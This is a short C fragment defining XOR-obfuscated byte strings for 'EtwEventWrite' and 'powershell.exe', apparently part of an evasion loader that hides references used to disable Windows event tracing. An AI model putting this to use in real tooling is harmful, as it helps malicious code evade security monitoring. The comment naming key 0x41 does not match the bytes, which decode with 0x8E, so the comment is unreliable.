...
static const unsigned char xEtwEventWrite[] = {
    0xCB, 0xFA, 0xF9, 0xCB, 0xF8, 0xEB, 0xE0, 0xFA,
    0xD9, 0xFC, 0xE7, 0xFA, 0xEB
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0xFE, 0xE1, 0xF9, 0xEB, 0xFC, 0xFD, 0xE6, 0xEB,
    0xE2, 0xE2, 0xA0, 0xEB, 0xF6, 0xEB
};
